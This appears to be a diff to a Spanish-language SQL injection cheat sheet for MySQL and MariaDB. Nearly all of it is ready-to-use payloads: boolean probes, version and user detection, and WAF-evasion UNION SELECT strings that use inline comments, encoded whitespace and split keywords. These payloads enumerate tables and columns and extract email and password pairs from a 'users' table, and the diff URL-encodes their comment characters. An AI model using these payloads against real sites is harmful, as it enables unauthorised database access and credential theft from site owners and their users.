@@ -11,6 +11,7 @@ ELT((1=1),1,2)
 1-IF(1=2,0,1)
 1'
 1"
+(1)and(1)=(1)--
 1\
 1)
 1')
@@ -54,7 +55,7 @@ SELECT SLEEP(25)--
 ```bash
 # Payloads para detectar la version.
 1' UNION SELECT @@version,USER(),DATABASE()# <<< para 3 columnas
-1' AND @@version LIKE '%MariaDB'#
+1' AND @@version LIKE '%MariaDB'%23
 1' UNION SELECT @@version_comment,@@version_compile_os,@@version_compile_machine# <<< para 3 columnas
 ```
 **`⃤⃞⃟⃤`** Usuario y privilegios.
@@ -167,21 +168,27 @@ SELECT SLEEP(25)--
 **`⃤⃞⃟⃤`** WAF payloads (Union select 3 columnas).
 ```bash
 # Tablas
--1%09/*!80000UNION*/%09ALL%09/*!40100SELECT*/%09/*!80000NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(table_name)%09/*!30001FROM*/%09information_schema.tables%09/*!80000WHERE*/%09table_schema=DATABASE()),/*!80000NULL*/#
+-1%09/*!80000UNION*/%09ALL%09/*!40100SELECT*/%09/*!80000NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(table_name)%09/*!30001FROM*/%09information_schema.tables%09/*!80000WHERE*/%09table_schema=DATABASE()),/*!80000NULL*/%23
+
 -1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema%3DDATABASE())%2Cnull%23
--1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(table_name)/**/FR/**/OM/**/informati/**/on_schema.tables/**/WH/**/ERE/**/table_schema=DATABASE()),NULL#
+
+-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(table_name)/**/FR/**/OM/**/informati/**/on_schema.tables/**/WH/**/ERE/**/table_schema=DATABASE()),NULL%23
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Columnas de la tabla "users" en hexadecimal.
--1%09/*!80000UNION*/%09ALL%09/*!50708SELECT*/%09/*!40100NULL*/,(/*!50708SELECT*/%09GROUP_CONCAT(column_name)%09/*!80000FROM*/%09information_schema.columns%09/*!80000WHERE*/%09table_name=0x7573657273),/*!40100NULL*/#
+-1%09/*!80000UNION*/%09ALL%09/*!50708SELECT*/%09/*!40100NULL*/,(/*!50708SELECT*/%09GROUP_CONCAT(column_name)%09/*!80000FROM*/%09information_schema.columns%09/*!80000WHERE*/%09table_name=0x7573657273),/*!40100NULL*/%23
+
 -1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name%3D0x7573657273)%2Cnull%23
--1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(column_name)/**/FR/**/OM/**/informati/**/on_schema.columns/**/WH/**/ERE/**/table_name=0x7573657273),NULL#
+
+-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(column_name)/**/FR/**/OM/**/informati/**/on_schema.columns/**/WH/**/ERE/**/table_name=0x7573657273),NULL%23
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Datos de las columnas "email y pass" de la tabla "users".
--1%09/*!50611UNION*/%09ALL%09/*!40100SELECT*/%09/*!40100NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(CONCAT_WS(0x3a,email,pass)%09SEPARATOR%090x7c)%09/*!50708FROM*/%09users),/*!40100NULL*/#
+-1%09/*!50611UNION*/%09ALL%09/*!40100SELECT*/%09/*!40100NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(CONCAT_WS(0x3a,email,pass)%09SEPARATOR%090x7c)%09/*!50708FROM*/%09users),/*!40100NULL*/%23
+
 -1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(concat_WS(0x3a%2Cemail%2Cpass)%0ASEPARATor%0A0x7c)%0Afrom%0Ausers)%2Cnull%2Cnull%23
--1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(CONC/**/AT_WS(0x3a,email,pass)/**/SEPARATOR/**/0x7c)/**/FR/**/OM/**/users),NULL,NULL#
+
+-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(CONC/**/AT_WS(0x3a,email,pass)/**/SEPARATOR/**/0x7c)/**/FR/**/OM/**/users),NULL,NULL%23
 ```
 **`⃤⃞⃟⃤`** Waf comments, whitespace y url encode.
 ```bash
